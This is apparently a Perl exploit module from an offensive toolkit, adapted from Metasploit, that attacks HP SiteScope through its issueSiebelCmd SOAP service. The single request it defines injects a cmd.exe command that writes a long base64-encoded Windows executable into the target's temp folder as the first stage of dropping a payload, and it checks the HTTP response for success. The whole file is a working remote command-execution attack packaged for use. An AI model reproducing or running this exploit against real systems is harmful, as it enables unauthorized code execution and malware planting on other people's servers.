package P1rK3r::Exploits::HP::MSF::HpSitescopeIssuesiebelcmd;
use parent qw(P1rK3r::Exploit P1rK3r::Services::HP);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "HpSitescopeIssuesiebelcmd";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT2 => {
                        METHOD       => 'POST',
                        PATH         => 'services/APISiteScopeImpl',
                        PAYLOAD      => '<soapenv:Envelope xmlns:api='http://Api.freshtech.COM' xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><soapenv:Header/><soapenv:Body><api:issueSiebelCmd soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'><in0 xsi:type='xsd:string'>cmd.exe /c echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACTOPDW11mehddZnoXXWZ6FrEWShdNZnoVURZCF3lmehbhGlIXcWZ6FuEaahdRZnoXXWZ+FHlmehVRRw4XfWZ6Fg3quhf9ZnoUQX5iF1lmehVJpY2jXWZ6FAAAAAAAAAAAAAAAAAAAAAFBFAABMAQQAvABwSgAAAAAAAAAA4AAPAQsBBgAAsAAAAKAAAAAAAADfSwAAABAAAADAAAAAAEAAABAAAAAQAAAEAAAAAAAAAAQAAAAAAAAAAGABAAAQAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAbMcAAHgAAAAAUAEAyAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODBAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAADgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABmqQAAABAAAACwAAAAEAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA5g8AAADAAAAAEAAAAMAAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAFxwAAAA0AAAAEAAAADQAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADIBwAAAFABAAAQAAAAEAEAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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>>%TEMP%\LqAJU.b64 &#x26; /u SGqe /p Kgif</in0></api:issueSiebelCmd></soapenv:Body></soapenv:Envelope>',
                        TEXT         => 'Sending Exploit #2 Request : [POST] /services/APISiteScopeImpl',
                        HEADERS      => {
                           'SOAPAction' => '""',
                           'Content-Type' => 'text/xml; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
